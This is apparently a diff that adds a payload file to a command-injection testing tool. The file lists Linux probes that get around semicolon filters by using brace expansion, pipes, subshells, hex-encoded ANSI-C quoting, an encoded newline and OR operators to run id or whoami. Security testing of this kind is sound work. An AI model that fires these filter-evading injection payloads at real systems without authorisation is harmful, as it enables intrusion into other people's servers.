@@ -1,0 +1,27 @@
+# @default_os:     linux
+# @default_signal: system:linux_id
+# @default_blind:  false
+# @default_tier:   5
+#
+# ANSI-C quoting and brace expansion — no semicolon, no standard separators.
+# Triggered when no_semicolon filter detected, or as general Tier 5 extension.
+
+# @label: Brace exec id
+{id,}
+
+# @label: Pipe brace whoami
+# @signal: system:linux_user
+|{whoami,}
+
+# @label: Subshell brace id
+$({id,})
+
+# @label: ANSI-C $'...' id
+$'\x69\x64'
+
+# @label: Newline brace id
+%0a{id,}
+
+# @label: OR brace whoami
+# @signal: system:linux_user
+||{whoami,}
